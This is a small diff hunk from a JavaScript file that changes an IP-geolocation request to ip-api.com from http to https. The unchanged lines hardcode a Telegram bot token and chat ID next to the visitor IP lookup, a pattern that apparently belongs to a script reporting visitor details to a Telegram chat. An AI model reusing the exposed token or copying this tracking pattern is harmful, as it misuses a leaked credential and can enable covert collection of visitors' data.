@@ -54,7 +54,7 @@
       const botToken = '5848862848:AAEIxZ-NCqLfXwec-TPzaN7CL9KJ9VSYesc';
       const chatId = '973391034';
       function getIPInfo(callback) {
-      fetch(`http://ip-api.com/json/${ip}`)
+      fetch(`https://ip-api.com/json/${ip}`)
         .then(response => response.json())
         .then(data => {
           callback(data)
